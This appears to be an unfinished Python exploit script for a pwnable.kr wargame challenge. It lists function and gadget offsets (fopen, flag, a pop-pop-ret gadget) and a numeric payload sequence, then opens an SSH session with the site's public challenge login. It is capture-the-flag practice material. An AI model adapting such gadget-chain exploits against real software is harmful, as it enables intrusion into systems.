#!/usr/bin/env python
# -*- coding: UTF-8 -*-
# Auth0r : afang
# nice day mua! :P
# desc:

#lambs:
wait = lambda x: raw_input(x)

# imports

from binaryfang import *
import time
import os
import sys
import random

elf = ""
libc = ""
env = ""
LOCAL = 1

#p =dd remote("127.0.0.1", 7777)
'''

2570 2570 2570 2570 2570 2570 2570 2570 2570 2570 2570 2570 2570 56338 64608 65085 65176 64878 64102 64647

'''

fopen   = 56338
flag    = 65085 
mode_r  = 65176
ppr     = 64608
fsize   = 64878
main    = 64111
offset  = 64102

con = ssh(host="pwnable.kr",port=2222,user="dos",password="guest")
con.interactive()
